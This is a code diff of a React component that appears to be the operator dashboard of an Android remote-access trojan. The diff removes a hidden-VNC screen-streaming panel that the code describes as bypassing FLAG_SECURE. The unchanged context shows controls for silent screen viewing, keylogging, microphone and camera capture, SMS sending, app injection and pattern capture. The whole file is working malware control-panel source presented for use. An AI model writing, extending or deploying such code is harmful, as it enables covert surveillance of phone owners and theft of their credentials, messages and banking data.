@@ -57,16 +57,6 @@ export default function HvncView({ device, hvncHandlerRef }) {
   const [quality,   setQuality]   = useState(80);
   const [toggles,   setToggles]   = useState({ mic: false, cam: false, keylog: false, reader: false });
 
-  // ── MediaProjection HVNC (type 0x04) ────────────────────────────────────
-  const mpCanvasRef = useRef(null);
-  const mpImgRef    = useRef(null);
-  const mpUrlQueue  = useRef([]);
-  const mpFpsCount  = useRef({ n: 0, t: Date.now() });
-  const [mpFps,      setMpFps]      = useState(0);
-  const [mpStreaming,setMpStreaming] = useState(false);
-  const [mpQuality,  setMpQuality]  = useState(60);
-  const [mpMode,     setMpMode]     = useState('stopped'); // 'stopped'|'running'
-
   // Modals
   const [modal,    setModal]    = useState(null); // 'type'|'inject'|'app'|'sms'|'pattern'
   const [modalVal, setModalVal] = useState({ text: '', phone: '', msg: '', pkg: '', pattern: '' });
@@ -100,48 +90,15 @@ export default function HvncView({ device, hvncHandlerRef }) {
     return () => { img.src = ''; };
   }, []);
 
-  // ── MediaProjection HVNC image pipeline (type 0x04) ──────────────────────
-  useEffect(() => {
-    const mpImg = new Image();
-    mpImgRef.current = mpImg;
-
-    mpImg.onload = () => {
-      const canvas = mpCanvasRef.current;
-      if (!canvas) return;
-      const ctx = canvas.getContext('2d');
-      ctx.drawImage(mpImg, 0, 0, canvas.width, canvas.height);
-
-      mpFpsCount.current.n++;
-      const now = Date.now();
-      if (now - mpFpsCount.current.t >= 1000) {
-        setMpFps(mpFpsCount.current.n);
-        mpFpsCount.current = { n: 0, t: now };
-      }
-
-      const old = mpUrlQueue.current.shift();
-      if (old) URL.revokeObjectURL(old);
-      setMpStreaming(true);
-    };
-
-    return () => { mpImg.src = ''; };
-  }, []);
-
   // ── HVNC frame handler (registered with App.jsx) ─────────────────────────
 
   const onFrame = useCallback((frameType, payload) => {
+    // 0x01 = screen, 0x02 = camera (both JPEG)
+    if (frameType !== 0x01 && frameType !== 0x02) return;
     const blob = new Blob([payload], { type: 'image/jpeg' });
     const url  = URL.createObjectURL(blob);
-
-    if (frameType === 0x01 || frameType === 0x02) {
-      // Accessibility HVNC + camera → main canvas
-      urlQueue.current.push(url);
-      if (imgRef.current) imgRef.current.src = url;
-    } else if (frameType === 0x04) {
-      // MediaProjection HVNC → second canvas
-      mpUrlQueue.current.push(url);
-      if (mpImgRef.current) mpImgRef.current.src = url;
-      setMpMode('running');
-    }
+    urlQueue.current.push(url);
+    if (imgRef.current) imgRef.current.src = url;
   }, []);
 
   useEffect(() => {
@@ -166,20 +123,6 @@ export default function HvncView({ device, hvncHandlerRef }) {
     cmd('TOGGLE_SILENT_VNC', { enabled: false });
     setStreaming(false);
     setFps(0);
-  }
-
-  // ── MediaProjection HVNC controls ─────────────────────────────────────────
-  function startMpHvnc() {
-    cmd('SET_MP_HVNC_QUALITY', { quality: mpQuality });
-    cmd('TOGGLE_MP_HVNC', { enabled: true, quality: mpQuality });
-    setMpMode('running');
-  }
-
-  function stopMpHvnc() {
-    cmd('TOGGLE_MP_HVNC', { enabled: false });
-    setMpMode('stopped');
-    setMpStreaming(false);
-    setMpFps(0);
   }
 
   function toggle(key, action) {
@@ -425,74 +368,6 @@ export default function HvncView({ device, hvncHandlerRef }) {
               onClick={() => cmd(b.cmd)} />
           ))}
         </Row>
-      </div>
-
-      {/* ══ MEDIAPROJECTION HVNC PANEL ═══════════════════════════════════════ */}
-      <div style={{ background: '#0a0a10', borderTop: '1px solid #2d1b69', padding: '8px 12px', flexShrink: 0 }}>
-
-        {/* Header */}
-        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6 }}>
-          <span style={{ color: '#a78bfa', fontWeight: 700, fontSize: 12, letterSpacing: 1 }}>MP-HVNC</span>
-          <span style={{ fontSize: 10, color: '#4b5563' }}>MediaProjection Engine · type 0x04</span>
-          <span style={{ marginLeft: 'auto', fontSize: 10,
-            color: mpStreaming ? '#4ade80' : '#6b7280' }}>
-            {mpStreaming ? `● LIVE ${mpFps} FPS` : '○ idle'}
-          </span>
-        </div>
-
-        <div style={{ display: 'flex', gap: 10, alignItems: 'flex-start', flexWrap: 'wrap' }}>
-          {/* Second canvas — MP-HVNC frames */}
-          <canvas
-            ref={mpCanvasRef}
-            width={540}
-            height={960}
-            style={{
-              width: 160,
-              height: 284,
-              background: '#050508',
-              borderRadius: 6,
-              border: mpStreaming ? '1px solid #7c3aed' : '1px solid #1f1f35',
-              display: 'block',
-              flexShrink: 0,
-            }}
-          />
-
-          {/* Controls */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 6, flex: 1, minWidth: 150 }}>
-            <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
-              {mpMode !== 'running'
-                ? <button onClick={startMpHvnc}
-                    style={{ background: '#5b21b6', color: '#fff', border: 'none',
-                      borderRadius: 4, padding: '5px 12px', cursor: 'pointer', fontSize: 12 }}>
-                    ▶ Start MP-HVNC
-                  </button>
-                : <button onClick={stopMpHvnc}
-                    style={{ background: '#7f1d1d', color: '#fff', border: 'none',
-                      borderRadius: 4, padding: '5px 12px', cursor: 'pointer', fontSize: 12 }}>
-                    ■ Stop MP-HVNC
-                  </button>
-              }
-            </div>
-
-            <label style={{ fontSize: 11, color: '#9ca3af', display: 'flex', alignItems: 'center', gap: 6 }}>
-              Quality
-              <input type="range" min={10} max={90} step={5} value={mpQuality}
-                onChange={e => {
-                  const q = +e.target.value;
-                  setMpQuality(q);
-                  if (mpMode === 'running') cmd('SET_MP_HVNC_QUALITY', { quality: q });
-                }}
-                style={{ flex: 1 }} />
-              <span style={{ color: '#e5e7eb', minWidth: 28 }}>{mpQuality}%</span>
-            </label>
-
-            <div style={{ fontSize: 10, color: '#374151', lineHeight: 1.5 }}>
-              Runs independently of Accessibility service.
-              Bypasses FLAG_SECURE on most ROMs.
-              Requires one-time on-device grant.
-            </div>
-          </div>
-        </div>
       </div>
 
       {/* ══ MODALS ════════════════════════════════════════════════════════════ */}
